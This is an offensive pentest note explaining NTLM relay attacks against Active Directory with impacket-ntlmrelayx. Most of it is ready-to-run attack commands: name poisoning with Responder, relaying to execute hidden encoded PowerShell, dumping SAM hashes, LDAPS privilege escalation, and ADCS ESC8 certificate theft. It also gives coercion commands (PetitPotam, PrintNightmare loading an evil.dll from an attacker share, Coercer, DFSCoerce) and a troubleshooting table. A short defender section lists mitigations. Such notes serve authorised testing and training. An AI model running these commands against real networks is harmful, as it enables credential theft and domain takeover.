---
tags: [pentest, impacket, ntlm-relay, ntlmrelayx, ad, active-directory, initial-access, windows]
tool: impacket-ntlmrelayx
phase: 5
---
# ntlmrelayx - NTLM Relay

When SMB signing is NOT required, NTLM authentication can be relayed: you trick a victim into authenticating to you, you forward (relay) that auth to another target service.

[[06 - Gaining Access/00 - README|Folder index]]

## Pre-flight

1. **Find targets that DO NOT require SMB signing**:

```bash
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# Produces a file of hosts that are relay-able
```

Or with `crackmapexec`:

```bash
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
```

2. **Disable Responder's SMB and HTTP** (so it doesn't catch the auth instead):

```bash
sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
```

3. **Start poisoning to drive victims to you**:

```bash
sudo responder -I eth0 -wdv      # poison names only, no service capture
```

## Run

### SMB → SMB relay (execute command)

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
  -c "powershell -nop -w hidden -enc <base64>"
```

When a victim authenticates to your poisoned name, ntlmrelayx forwards that auth to one of the targets in `relay_targets.txt` and runs `-c` if it gets admin.

### SMB → SMB relay (dump SAM)

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --dump-sam
```

### SMB → LDAP/LDAPS relay (privilege escalation)

```bash
impacket-ntlmrelayx -t ldaps://dc01.corp.local --escalate-user pwn3duser -smb2support
# Adds pwn3duser to a privileged group via LDAP-write rights of the relayed account
```

### SMB → ADCS HTTP relay (ESC8 - cert for any user)

```bash
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs \
  --template "DomainController" -smb2support
# Coerce a DC to auth back (PetitPotam) - get a cert with DC's identity - DA via certipy
```

### Socks - interactive relayed sessions

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# When auth lands, an in-memory session is held open
# Use it through socks:
proxychains nxc smb <ip> -u user -p '' -k
```

(Edit `/etc/proxychains.conf` to point at `socks4 127.0.0.1 1080`.)

## Coercion - making victims auth to you

If broadcast poisoning isn't yielding, force a DC or server to auth back:

```bash
# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py 10.10.14.5 <dc-ip>

# PrintNightmare-derived (MS-RPRN)
impacket-PrintNightmare.py corp.local/user:'pass'@<dc>.corp.local \
  '\\10.10.14.5\share\evil.dll'

# Coercer (all-in-one - tries every known coercion)
Coercer.py coerce -u user -p pass -d corp.local -l 10.10.14.5 -t <dc>

# MS-DFSNM
python3 dfscoerce.py 10.10.14.5 <dc> -u user -p pass -d corp.local
```

Each of these triggers an outbound auth from the coerced host to your IP. Pair with ntlmrelayx for impact.

## Successful relay output

```text
[*] Authenticating against smb://10.0.0.10 as CORP/ADMIN SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `Signing is required` | Target requires SMB signing - can't relay SMB→SMB. Try SMB→LDAP. |
| `LDAP signing required` (Server 2019+ default) | Use LDAPS instead of LDAP, with `-t ldaps://`. |
| `Authentication failed` | Cred coming in is wrong, or relayed account has no rights on target. Try a different target. |
| `MIC validation failed` | EPA / channel binding enabled on target. Move on. |
| Nothing happens after running | Did you stop SMB/HTTP in Responder.conf? Did you start Responder in another terminal? |

## Detection (defender view)

- Enforce SMB signing everywhere (`RequireSecuritySignature=1`).
- LDAP signing + LDAP channel binding on DCs.
- Disable EFSRPC / MS-RPRN where not needed (or patch).
- Monitor for: SMB auth from non-domain-joined IPs, anonymous LDAP binds, sudden GPO/group modifications.
- Sigma: `lateral_movement_ntlmrelayx_relay.yml`.

> [!warning] This attack is loud
> Authenticated relay events log to multiple places. Document precisely when you start/stop. In real engagements, coordinate with SOC if they're tuning detection.

## See also

- [[11 - Responder LLMNR NBT-NS Poisoning]]
- [[22 - Coercion (PetitPotam Coercer)]]
- [[21 - Certipy ESC Attacks]] (ESC8 is the ADCS HTTP relay target)
